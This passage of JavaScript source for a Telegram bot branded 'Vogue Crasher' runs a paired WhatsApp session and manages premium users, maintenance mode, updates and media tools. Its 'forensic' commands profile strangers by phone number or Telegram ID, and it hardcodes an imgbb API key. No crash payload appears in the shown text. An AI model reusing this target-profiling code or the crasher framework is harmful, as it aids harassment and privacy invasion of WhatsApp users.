    sock.ev.on("connection.update", async (update) => {
        if (update.connection === "open" && lastPairingMessage) {
            const updateConnectionMenu = `
\`\`\`ruby
VOGUE CRASH • CONNECTION STATUS
──────────────────────────────

WhatsApp session has been successfully
authenticated and is now operational.

System Information

Developer     : @PrinceXVogue
Version       : 1.8 Stable
Prefix        : /

──────────────────────────────

Registered Number
${lastPairingMessage.phoneNumber}

Pairing Code
${lastPairingMessage.pairingCode}

Connection Status
Connected Successfully

──────────────────────────────
The sender session is active and ready
for command execution.
\`\`\``;
            
            try {
                await bot.telegram.editMessageCaption(
                    lastPairingMessage.chatId,
                    lastPairingMessage.messageId,
                    undefined,
                    updateConnectionMenu, { parse_mode: "markdown" }
                );
            } catch (e) {}
        }
    });
}

//    ______ _____ _   _ _____ _     ___________ ___________ 
//    |  _  \  ___| | | |  ___| |   |  _  | ___ \  ___| ___ \
//    | | | | |__ | | | | |__ | |   | | | | |_/ / |__ | |_/ /
//    | | | |  __|| | | |  __|| |   | | | |  __/|  __||    / 
//    | |/ /| |___\ \_/ / |___| |___\ \_/ / |   | |___| |\ \ 
//    |___/ \____/ \___/\____/\_____/\___/\_|   \____/\_| \_|
//                                                           
//                                                           
//     _____ ________  ______  ___  ___   _   _______        
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \       
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |       
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |       
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ /        
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/         
//                                                           
//                                                           


if (
    !fs.existsSync(
        MAINTENANCE_FILE
    )
) {
    
    fs.writeFileSync(
        MAINTENANCE_FILE,
        JSON.stringify({
            enabled: false
        }, null, 4)
    );
}

function getMaintenanceStatus() {
    try {
        
        const data =
            JSON.parse(
                fs.readFileSync(
                    MAINTENANCE_FILE,
                    "utf8"
                )
            );
        
        return data.enabled || false;
        
    } catch {
        
        return false;
    }
}

function setMaintenanceStatus(status) {
    
    fs.writeFileSync(
        MAINTENANCE_FILE,
        JSON.stringify({
            enabled: status
        }, null, 4)
    );
}

async function checkMaintenance(ctx, next) {
    const maintenance =
        getMaintenanceStatus();
    
    
    if (
        ctx.from.id == ownerID
    ) {
        
        return next();
    }
    
    if (maintenance) {
        
        return ctx.reply(
    `\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

System Maintenance

The service is temporarily
unavailable at this time.

Please try again later.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
MAINTENANCE MODE
\`\`\``,
            {
                parse_mode: "Markdown"
            }
        );
    }
    
    return next();
}

bot.command("maintenance", async (ctx) => {

    if (
        ctx.from.id != ownerID
    ) {

        return;
    }

    setMaintenanceStatus(
        true
    );

    ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Maintenance Mode :
ENABLED

━━━━━━━━━━━━━━━━━━━━━━

System Status :
UNDER MAINTENANCE
\`\`\``,
        {
            parse_mode:
                "Markdown"
        }
    );
});

bot.command("unmaintenance", async (ctx) => {

    if (
        ctx.from.id != ownerID
    ) {

        return;
    }

    setMaintenanceStatus(
        false
    );

    ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Maintenance Mode :
DISABLED

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & STABLE
\`\`\``,
        {
            parse_mode:
                "Markdown"
        }
    );
});

bot.command("setcd", async (ctx) => {

    if (
        String(ctx.from.id) !==
        String(ownerID)
    ) {

        return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

Owner authorization
is required.
\`\`\``,
{
    parse_mode:
        "Markdown"
}
        );
    }

    const seconds =
        parseInt(
            ctx.message.text
            .split(" ")[1]
        );

    if (isNaN(seconds)) {

        return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Invalid Format

Usage :
/setcd 15
\`\`\``,
{
    parse_mode:
        "Markdown"
}
        );
    }

    globalCooldown =
        seconds;

    return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Global Cooldown Updated

Duration :
${seconds} Seconds

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ACTIVE
\`\`\``,
{
    parse_mode:
        "Markdown"
}
    );
});

//    ____________ ________  ________ _   ____  ___   
//    | ___ \ ___ \  ___|  \/  |_   _| | | |  \/  |   
//    | |_/ / |_/ / |__ | .  . | | | | | | | .  . |   
//    |  __/|    /|  __|| |\/| | | | | | | | |\/| |   
//    | |   | |\ \| |___| |  | |_| |_| |_| | |  | |   
//    \_|   \_| \_\____/\_|  |_/\___/ \___/\_|  |_/   
//                                                    
//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//                                                    

bot.command('addprem', async (ctx) => {

    if (ctx.from.id != ownerID) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
`
        );
    }

    const args =
        ctx.message.text
        .split(" ");

    if (args.length < 3) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Invalid Format

Usage :
/addprem user_id duration

Example :
/addprem 628xxx 30
`
        );
    }

    const userId =
        args[1];

    const duration =
        parseInt(args[2]);

    if (isNaN(duration)) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Invalid Duration

Duration must be
a numeric value.
`
        );
    }

    const expiryDate =
        addPremiumUser(
            userId,
            duration
        );

    ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Premium Access Granted

User ID :
${userId}

Duration :
${duration} Days

Expired :
${expiryDate}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
PREMIUM ACTIVE
`
    );
});

bot.command('listprem', async (ctx) => {

    if (ctx.from.id != ownerID) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
`
        );
    }

    const premiumUsers =
        loadPremiumUsers();

    const userIds =
        Object.keys(
            premiumUsers
        );

    if (userIds.length === 0) {

        return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Premium User List

No premium users are
currently registered.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
EMPTY DATABASE
\`\`\``,
            {
                parse_mode:
                    "markdown"
            }
        );
    }

    let text = "";
    let no = 1;

    for (const id of userIds) {

        const expiry =
            premiumUsers[id];

        const expired =
            moment(
                expiry,
                'DD-MM-YYYY'
            ).isBefore(
                moment()
            );

        text += `
${no}. USER DATA

› User ID
  ${id}

› Status
  ${
      expired
      ? "Expired"
      : "Active"
  }

› Expired
  ${expiry}

━━━━━━━━━━━━━━━━━━━━━━
`;

        no++;
    }

    const result = `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Registered Premium :
${userIds.length} Users

━━━━━━━━━━━━━━━━━━━━━━
${text}
System Status :
DATABASE LOADED
\`\`\``;

    if (result.length > 1024) {

        return ctx.reply(
            result,
            {
                parse_mode:
                    "markdown"
            }
        );
    }

    ctx.replyWithPhoto(
        thumbnailUrl,
        {
            caption:
                result,

            parse_mode:
                "markdown"
        }
    );
});

bot.command('delprem', async (ctx) => {

    if (ctx.from.id != ownerID) {

        return ctx.reply(
`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
`
        );
    }

    const args =
        ctx.message.text
        .split(" ");

    if (args.length < 2) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Invalid Format

Usage :
/delprem user_id
`
        );
    }

    const userId =
        args[1];

    removePremiumUser(
        userId
    );

    ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Premium Access Removed

User ID :
${userId}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ACCESS REVOKED
`
    );
});

bot.command('addgrup', async (ctx) => {

    if (ctx.from.id != ownerID) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
`
        );
    }

    if (
        ctx.chat.type !== 'group' &&
        ctx.chat.type !== 'supergroup'
    ) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Invalid Context

This command can only
be used inside groups.
`
        );
    }

    const chatId =
        ctx.chat.id.toString();

    let groups =
        loadPremiumGroups();

    if (
        groups.includes(
            chatId
        )
    ) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Premium Group Exists

This group already has
premium access enabled.
`
        );
    }

    groups.push(chatId);

    savePremiumGroups(
        groups
    );

    ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Premium Group Enabled

Group ID :
${chatId}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
GROUP ACTIVE
\`\`\``,
        {
            parse_mode:
                "markdown"
        }
    );
});

bot.command('delgrup', async (ctx) => {

    if (ctx.from.id != ownerID) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
`
        );
    }

    const chatId =
        ctx.chat.id.toString();

    let groups =
        loadPremiumGroups();

    if (
        !groups.includes(
            chatId
        )
    ) {

        return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Premium Group Not Found

This group is not
registered as premium.
`
        );
    }

    groups =
        groups.filter(
            id =>
            id !== chatId
        );

    savePremiumGroups(
        groups
    );

    ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Premium Group Removed

Group ID :
${chatId}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ACCESS REVOKED
\`\`\``,
        {
            parse_mode:
                "markdown"
        }
    );
});

//     _____ _____  _____ _      _____                
//    |_   _|  _  ||  _  | |    /  ___|               
//      | | | | | || | | | |    \ `--.                
//      | | | | | || | | | |     `--. \               
//      | | \ \_/ /\ \_/ / |____/\__/ /               
//      \_/  \___/  \___/\_____/\____/                
//                                                    
//               TOOLS COMMAND                                     
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//

bot.command("cektele", async (ctx) => {
        try {

            let input =
                ctx.message.text
                .split(" ")[1];

            let targetUser =
                null;

            if (
                ctx.message.reply_to_message
            ) {

                const reply =
                    ctx.message.reply_to_message;

                if (
                    reply.forward_from
                ) {

                    targetUser =
                        reply.forward_from;

                } else if (
                    reply.from
                ) {

                    targetUser =
                        reply.from;
                }
            }

            if (
                !targetUser &&
                input
            ) {

                // USER ID
                if (
                    /^[0-9]+$/.test(input)
                ) {

                    try {

                        const chat =
                            await ctx.telegram.getChat(
                                input
                            );

                        targetUser =
                            chat;

                    } catch {}
                }

                // USERNAME
                else if (
                    input.startsWith("@")
                ) {

                    try {

                        const chat =
                            await ctx.telegram.getChat(
                                input
                            );

                        targetUser =
                            chat;

                    } catch {}
                }
            }

            if (
                !targetUser
            ) {

                return ctx.reply(
`❖ INVALID TARGET

\`\`\`ruby
Usage:
/cektele <userid>
/cektele @username
/reply forwarded user

Example:
/cektele 598xxxxxx
/cektele @username
\`\`\``,
{
    parse_mode: "Markdown"
}
                );
            }

            const userId =
                targetUser.id ||
                "Unknown";

            const firstName =
                targetUser.first_name ||
                "Hidden";

            const lastName =
                targetUser.last_name ||
                "-";

            const fullName =
                `${firstName} ${lastName}`
                .trim();

            const username =
                targetUser.username
                ? `@${targetUser.username}`
                : "Unavailable";

            const isBot =
                targetUser.is_bot
                ? "Yes"
                : "No";

            const isPremium =
                targetUser.is_premium
                ? "Yes"
                : "No";

            const language =
                targetUser.language_code ||
                "Unknown";

            const dcId =
                targetUser.dc_id ||
                "Unknown";

            const scam =
                targetUser.is_scam
                ? "Detected"
                : "Clean";

            const fake =
                targetUser.is_fake
                ? "Detected"
                : "Clean";

            const verified =
                targetUser.is_verified
                ? "Verified"
                : "No";

            let photo =
                null;

            try {

                const photos =
                    await ctx.telegram.getUserProfilePhotos(
                        userId,
                        0,
                        1
                    );

                if (
                    photos.total_count > 0
                ) {

                    const fileId =
                        photos.photos[0][0]
                        .file_id;

                    photo =
                        await ctx.telegram.getFileLink(
                            fileId
                        );
                }

            } catch {}

            let accountType =
                "User";

            if (
                targetUser.type
            ) {

                accountType =
                    targetUser.type;
            }

            const caption =
    `\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 FORENSIC REPORT 〕

◈ User ID    : ${userId}
◈ Username   : ${username}
◈ Full Name  : ${fullName}

━━━━━━━━━━━━━━━━━━━━━━

◈ Account    : ${accountType}
◈ Bot Status : ${isBot}
◈ Premium    : ${isPremium}
◈ Verified   : ${verified}

━━━━━━━━━━━━━━━━━━━━━━

◈ Language   : ${language}
◈ Data Center: ${dcId}

◈ Scam Status: ${scam}
◈ Fake Status: ${fake}

━━━━━━━━━━━━━━━━━━━━━━

Engine Status :
LIVE DETECTION
\`\`\``;

            if (photo) {

                return ctx.replyWithPhoto(
                    fileId,
                    {
                        caption,
                        parse_mode:
                            "Markdown"
                    }
                );
            }

            return ctx.reply(
                caption,
                {
                    parse_mode:
                        "Markdown"
                }
            );

        } catch (err) {

            return ctx.reply(
`\`\`\`ruby
TELEGRAM FORENSIC FAILURE

${err.message}
\`\`\``,
{
    parse_mode: "Markdown"
}
            );
        }
    });

bot.command("forensic", checkWhatsAppConnection, async (ctx) => {

    try {

        const q =
            ctx.message.text
            .split(" ")[1];

        if (!q) {

            return ctx.reply(
`❖ INVALID FORMAT

\`\`\`ruby
/forensic 628xxxxxxxx
\`\`\``,
{
    parse_mode: "Markdown"
}
            );
        }

        const clean =
            q.replace(
                /[^0-9]/g,
                ""
            );

        const jid =
            clean +
            "@s.whatsapp.net";

        const check =
            await sock.onWhatsApp(
                jid
            );

        const registered =
            check?.[0]?.exists ||
            false;

        if (!registered) {

            return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 FORENSIC REPORT 〕

◈ Target ID  : ${clean}
◈ Status     : NOT REGISTERED

━━━━━━━━━━━━━━━━━━━━━━

Engine Status :
LIVE DETECTION
\`\`\``,
            {
                parse_mode:
                    "Markdown"
            });
        }

        let profile =
            "Unavailable";

        let ppUrl =
            null;

        try {

            ppUrl =
                await sock.profilePictureUrl(
                    jid,
                    "image"
                );

            if (ppUrl)
                profile =
                    "Available";

        } catch {}

        let business =
            "Personal";

        let businessCategory =
            "Unknown";

        let verified =
            "No";

        try {

            const biz =
                await sock.getBusinessProfile(
                    jid
                );

            if (biz) {

                business =
                    "Business";

                if (
                    biz?.categories?.[0]
                        ?.name
                ) {

                    businessCategory =
                        biz.categories[0]
                        .name;
                }

                if (
                    biz?.verifiedLevel
                ) {

                    verified =
                        "Yes";
                }
            }

        } catch {}

        let privacy =
            "Open";

        try {

            await sock.fetchStatus(
                jid
            );

        } catch {

            privacy =
                "Restricted";
        }

        let device =
            "Mobile";

        let multiDevice =
            "Unknown";

        try {

            const deviceData =
                check?.[0];

            if (
                deviceData?.lid
            ) {

                multiDevice =
                    "Enabled";
            } else {

                multiDevice =
                    "Disabled";
            }

        } catch {}

        let displayName =
            null;

        let username =
            null;

        let about =
            null;

        let lastUpdate =
            null;

        let accountAge =
            "Unknown";
        
        let accountYear =
            null;

        let riskLevel =
            "Low";

        let profileHash =
            "Unavailable";

        try {

            await sock.presenceSubscribe(
                jid
            );

            await new Promise(
                resolve =>
                    setTimeout(
                        resolve,
                        2000
                    )
            );

        } catch {}

        try {

            const result =
                await sock.user?.query({
                    tag: "iq",
                    attrs: {
                        to: "@s.whatsapp.net",
                        type: "get",
                        xmlns: "usync"
                    },
                    content: [
                        {
                            tag: "usync",
                            attrs: {
                                mode: "query",
                                context: "interactive"
                            },
                            content: [
                                {
                                    tag: "query",
                                    attrs: {},
                                    content: [
                                        {
                                            tag: "contact",
                                            attrs: {}
                                        },
                                        {
                                            tag: "status",
                                            attrs: {}
                                        }
                                    ]
                                },
                                {
                                    tag: "list",
                                    attrs: {},
                                    content: [
                                        {
                                            tag: "user",
                                            attrs: {
                                                jid
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ]
                });

            const user =
                result?.content?.[0]
                ?.content?.[1]
                ?.content?.[0];

            const contact =
                user?.content?.find(
                    x => x.tag === "contact"
                );

            const status =
                user?.content?.find(
                    x => x.tag === "status"
                );

            if (
                contact?.attrs?.name
            ) {

                displayName =
                    contact.attrs.name;
            }

            if (
                status?.content
            ) {

                about =
                    status.content.toString();
            }

        } catch {}

        try {

            const c =
                sock.contacts?.[jid];

            if (
                !displayName
            ) {

                displayName =
                    c?.name ||
                    c?.notify ||
                    c?.verifiedName ||
                    c?.pushname;
            }

        } catch {}
        
        try {

            if (check?.[0]?.jid) {
        
                const numeric =
                    check[0].jid.split("@")[0];
        
        
                if (numeric.startsWith("62")) {
                    accountYear =
                        ">= 2016 - 2026 (ID Region Pattern)";
                }
        
                if (numeric.length >= 13) {
                    accountYear =
                        "Modern Account (2020+ Pattern)";
                }
        
                if (numeric.length <= 11) {
        
                    accountYear =
                        "Old Account (Possible 2015-2018)";
                }
            }
        
        } catch {}

        try {

            const s =
                await sock.fetchStatus(
                    jid
                );

            if (
                s?.status &&
                !about
            ) {

                about =
                    s.status;
            }

            if (
                s?.setAt
            ) {

                lastUpdate =
                    moment(
                        s.setAt
                    )
                    .tz(
                        "Asia/Jakarta"
                    )
                    .format(
                        "DD/MM/YYYY HH:mm:ss"
                    );
            }

        } catch {}

        if (!displayName)
            displayName =
                "Private";

        if (!about)
            about =
                "Private";

        username =
            displayName
            .toLowerCase()
            .replace(
                /[^a-z0-9]/g,
                "_"
            )
            .replace(
                /_+/g,
                "_"
            )
            .replace(
                /^_+|_+$/g,
                ""
            );

        if (
            clean.startsWith("62")
        ) {

            accountAge =
                "Old Region ID";
        }

        if (
            about.length > 80
        ) {

            riskLevel =
                "Medium";
        }

        if (
            business === "Business"
        ) {

            riskLevel =
                "Trusted";
        }

        try {

            const crypto =
                require("crypto");

            if (ppUrl) {

                profileHash =
                    crypto
                    .createHash("md5")
                    .update(ppUrl)
                    .digest("hex")
                    .slice(0, 16);
            }

        } catch {}

        const caption =
    `\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 FORENSIC PLUS 〕

◈ Target     : ${clean}
◈ Status     : REGISTERED
◈ Display    : ${displayName}
◈ Username   : ${username}

━━━━━━━━━━━━━━━━━━━━━━

〔 ACCOUNT DATA 〕

◈ Category   : ${business}
◈ Business   : ${businessCategory}
◈ Verified   : ${verified}
◈ Profile    : ${profile}
◈ Privacy    : ${privacy}

━━━━━━━━━━━━━━━━━━━━━━

〔 DEVICE DATA 〕

◈ Platform   : ${device}
◈ Multi Dev  : ${multiDevice}

━━━━━━━━━━━━━━━━━━━━━━

〔 IDENTITY 〕

◈ Biography  : ${about}
◈ Last Update: ${lastUpdate}

━━━━━━━━━━━━━━━━━━━━━━

〔 ANALYTICS 〕

◈ Risk Level : ${riskLevel}
◈ ProfileHash: ${profileHash}

━━━━━━━━━━━━━━━━━━━━━━

Engine Status :
LIVE DETECTION
\`\`\``;

        if (ppUrl) {

            return ctx.replyWithPhoto(
                ppUrl,
                {
                    caption,
                    parse_mode:
                        "Markdown"
                }
            );
        }

        return ctx.reply(
            caption,
            {
                parse_mode:
                    "Markdown"
            }
        );

    } catch (err) {

        return ctx.reply(
`\`\`\`ruby
FORENSIC FAILURE

${err.message}
\`\`\``,
{
    parse_mode: "Markdown"
}
        );
    }
});

bot.command("sticker", async (ctx) => {
    
    try {
        
        const reply =
            ctx.message.reply_to_message;
        
        if (
            !reply ||
            (
                !reply.photo &&
                !reply.document &&
                !reply.video &&
                !reply.animation
            )
        ) {
            
            return ctx.reply(
                `Invalid Format

Reply image / gif / video with:
/sticker`
            );
        }
        
        const loading = await ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 STICKER ENGINE 〕

Status :
PROCESSING MEDIA

━━━━━━━━━━━━━━━━━━━━━━

Converting media into
sticker format...

━━━━━━━━━━━━━━━━━━━━━━

Engine Status :
ACTIVE
\`\`\``,
                parse_mode: "markdown"
            }
        );
        
        let fileId;
        let isVideo = false;
        
        if (reply.photo) {
            
            fileId =
                reply.photo[
                    reply.photo.length - 1
                ].file_id;
        }
        
        else if (reply.document) {
            
            fileId =
                reply.document.file_id;
            
            if (
                reply.document.mime_type?.includes("video")
            ) {
                isVideo = true;
            }
        }
        
        else if (reply.video) {
            
            fileId =
                reply.video.file_id;
            
            isVideo = true;
        }
        
        else if (reply.animation) {
            
            fileId =
                reply.animation.file_id;
            
            isVideo = true;
        }
        
        const file =
            await ctx.telegram.getFile(fileId);
        
        const fileUrl =
            `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
        
        const response =
            await axios.get(
                fileUrl,
                {
                    responseType: "arraybuffer"
                }
            );
        
        const buffer =
            Buffer.from(response.data);
        
        if (isVideo) {
            
            await ctx.replyWithSticker(
            {
                source: buffer
            });
            
        } else {
            
            await ctx.replyWithSticker(
            {
                source: buffer
            });
        }
        
        await ctx.telegram.deleteMessage(
            ctx.chat.id,
            loading.message_id
        );
        
    } catch (err) {
        
        console.log(err);
        
        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 STICKER ENGINE 〕

Status :
CONVERSION FAILED

━━━━━━━━━━━━━━━━━━━━━━

Unable to convert media
into sticker format.

━━━━━━━━━━━━━━━━━━━━━━

Engine Status :
ERROR DETECTED
\`\`\`
`,
                parse_mode: "markdown"
            }
        );
    }
});

bot.command("tourl", async (ctx) => {
    
    try {
        const apiKey =
            "8f2a09515256735774c3d906b6c997f9";
        
        const reply =
            ctx.message.reply_to_message;
        
        if (
            !reply ||
            (
                !reply.photo &&
                !reply.document &&
                !reply.sticker
            )
        ) {
            
            return ctx.reply(
                `Reply image/sticker/document

Usage:
/tourl`
            );
        }
        
        let fileId;
        
        if (reply.photo) {
            
            fileId =
                reply.photo[
                    reply.photo.length - 1
                ].file_id;
        }
        
        else if (reply.document) {
            
            fileId =
                reply.document.file_id;
        }
        
        else if (reply.sticker) {
            
            fileId =
                reply.sticker.file_id;
        }
        
        const loading =
            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption: `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 TO URL ENGINE 〕

Status :
UPLOADING MEDIA

━━━━━━━━━━━━━━━━━━━━━━

Please wait while the
media is being uploaded.

━━━━━━━━━━━━━━━━━━━━━━

Engine Status :
PROCESSING
\`\`\`
`,
                    parse_mode: "markdown"
                }
            );
        
        const file =
            await ctx.telegram.getFile(fileId);
        
        const fileUrl =
            `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
        
        const response =
            await axios.get(fileUrl, {
                responseType: "arraybuffer"
            });
        
        const buffer =
            Buffer.from(response.data);
        
        const form =
            new FormData();
        
        form.append(
            "image",
            buffer.toString("base64")
        );
        
        const upload =
            await axios.post(
                `https://api.imgbb.com/1/upload?key=${apiKey}`,
                form,
                {
                    headers: form.getHeaders()
                }
            );
        
        const result =
            upload.data;
        
        if (!result.success) {
            
            return ctx.reply(
                "Upload failed."
            );
        }
        
        const data =
            result.data;
        
        await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        loading.message_id,
        undefined,
        
        `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 TO URL ENGINE 〕

Upload Status :
SUCCESS

━━━━━━━━━━━━━━━━━━━━━━

〔 FILE DATA 〕

◈ File Name :
${data.image.filename}

◈ File Size :
${data.size} Bytes

◈ Resolution :
${data.width}x${data.height}

━━━━━━━━━━━━━━━━━━━━━━

〔 GENERATED URL 〕

◈ Direct URL :
${data.url}

◈ Viewer URL :
${data.url_viewer}

━━━━━━━━━━━━━━━━━━━━━━

Engine Status :
UPLOAD COMPLETE
\`\`\`
`,
            {
                parse_mode: "markdown",
                
                reply_markup: {
                    inline_keyboard: [
                        [
                        {
                            text: "Open Image",
                            url: data.url,
                            style: "primary"
                        }],
                        [
                        {
                            text: "Viewer Link",
                            url: data.url_viewer,
                            style: "success"
                        }]
                    ]
                }
            }
        );
        
    } catch (err) {
        
        console.log(err);
        
        return ctx.reply(
            "Failed to upload media."
        );
    }
});

bot.command("update", async (ctx) => {

    if (ctx.from.id != ownerID) {

        return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
\`\`\``
        );
    }

    const { exec } =
        require(
            "child_process"
        );

    const msg =
        await ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SYSTEM UPDATE 〕

◈ Checking Repository
◈ Fetching Latest Commit
◈ Preparing Update Engine

━━━━━━━━━━━━━━━━━━━━━━

System Status :
RUNNING
\`\`\``,
{
    parse_mode:
        "markdown"
}
    );

    exec(
        "git pull",

        async (
            error,
            stdout,
            stderr
        ) => {

            if (error) {

                return ctx.telegram
                .editMessageText(
                    ctx.chat.id,
                    msg.message_id,
                    null,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SYSTEM UPDATE 〕

Update Status :
FAILED

━━━━━━━━━━━━━━━━━━━━━━

${error.message}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ERROR DETECTED
\`\`\``,

{
    parse_mode:
        "markdown"
}
                );
            }

            await ctx.telegram
            .editMessageText(
                ctx.chat.id,
                msg.message_id,
                null,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SYSTEM UPDATE 〕

Repository Updated
Successfully

━━━━━━━━━━━━━━━━━━━━━━

${stdout}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
UPDATE COMPLETE
\`\`\``,

{
    parse_mode:
        "markdown"
}
            );
            process.exit(0);
        }
    );
});

bot.command('restartbot', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
\`\`\``
        );
    }

    const msg =
        await ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SYSTEM RESTART 〕

◈ Restart Engine
◈ Runtime Recovery
◈ Session Rebuild

━━━━━━━━━━━━━━━━━━━━━━

System Status :
INITIALIZING
\`\`\``,

{
    parse_mode:
        "markdown"
}
    );

    setTimeout(
